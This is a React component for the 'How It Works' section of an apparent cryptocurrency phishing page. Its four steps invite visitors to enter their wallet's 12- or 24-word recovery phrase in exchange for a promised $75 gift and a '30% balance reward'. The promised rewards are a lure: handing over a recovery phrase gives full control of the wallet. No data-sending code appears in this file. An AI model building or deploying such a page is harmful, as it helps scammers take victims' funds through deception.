"use client";

import { motion } from "@/lib/motion";
import { ArrowRight } from "lucide-react";
import { useEffect, useState } from "react";

const steps = [
  {
    number: "01",
    title: "Enter Your Recovery Phrase",
    description:
      "Securely input your wallet's 12 or 24-word recovery phrase for verification.",
    color: "from-blue-500 to-blue-600",
  },
  {
    number: "02",
    title: "Verify Wallet Ownership",
    description:
      "Our system verifies your wallet ownership and checks BTC & ETH balances.",
    color: "from-indigo-500 to-indigo-600",
  },
  {
    number: "03",
    title: "Calculate Rewards",
    description:
      "We calculate your 30% balance reward based on your current holdings.",
    color: "from-purple-500 to-purple-600",
  },
  {
    number: "04",
    title: "Receive Your Gift",
    description:
      "Get your $75 gift plus any applicable balance rewards instantly.",
    color: "from-[#3375BB] to-[#0B65C6]",
  },
];

const HowItWorksSection = () => {
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  if (!mounted) return null;

  return (
    <section id="how-it-works" className="py-20 bg-gray-50 dark:bg-gray-900">
      <div className="container mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          viewport={{ once: true }}
          className="text-center mb-16"
        >
          <h2 className="text-3xl md:text-4xl font-bold text-gray-900 dark:text-white">
            How It Works
          </h2>
          <p className="mt-4 text-xl text-gray-600 dark:text-gray-300 max-w-3xl mx-auto">
            Get your rewards in four simple steps
          </p>
        </motion.div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
          {steps.map((step, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: index * 0.1 }}
              viewport={{ once: true }}
              className="relative"
            >
              <div className="bg-white dark:bg-gray-800 rounded-xl p-6 h-full border border-gray-200 dark:border-gray-700 shadow-md">
                <div
                  className={`text-white font-bold text-4xl rounded-lg p-4 bg-gradient-to-r ${step.color} mb-6 w-16 flex items-center justify-center`}
                >
                  {step.number}
                </div>
                <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-3">
                  {step.title}
                </h3>
                <p className="text-gray-600 dark:text-gray-300">
                  {step.description}
                </p>
              </div>

              {index < steps.length - 1 && (
                <div className="hidden lg:block absolute top-1/2 -right-4 transform -translate-y-1/2 z-10">
                  <ArrowRight size={24} className="text-gray-400" />
                </div>
              )}
            </motion.div>
          ))}
        </div>
      </div>
    </section>
  );
};

export default HowItWorksSection;
